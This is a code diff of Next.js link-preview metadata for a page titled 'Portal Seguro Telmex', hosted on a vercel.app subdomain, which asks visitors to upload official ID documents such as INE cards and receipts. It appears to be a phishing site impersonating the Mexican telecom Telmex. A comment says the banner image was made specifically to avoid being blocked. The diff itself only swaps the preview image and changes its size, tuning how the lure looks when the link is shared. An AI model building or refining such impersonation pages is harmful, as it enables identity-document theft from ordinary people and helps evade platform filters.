@@ -13,9 +13,9 @@ export const metadata: Metadata = {
         images: [
             {
                 // Un banner profesional y seguro generado específicamente para evitar bloqueos
-                url: 'https://telmex-panel.vercel.app/og-final.jpg',
+                url: 'https://telmex-panel.vercel.app/og-square.jpg',
                 width: 1200,
-                height: 630,
+                height: 1200,
                 alt: 'Portal Web Telmex - Envío Seguro',
             }
         ]
@@ -24,7 +24,7 @@ export const metadata: Metadata = {
         card: 'summary_large_image',
         title: '🔒 Portal Seguro Telmex | Envío de Documentos',
         description: 'Adjunta tus requisitos oficiales (INE, recibo, etc.) en este enlace para agilizar tu trámite de contratación con Telmex Infinitum.',
-        images: ['https://telmex-panel.vercel.app/og-final.jpg'],
+        images: ['https://telmex-panel.vercel.app/og-square.jpg'],
     }
 };
 
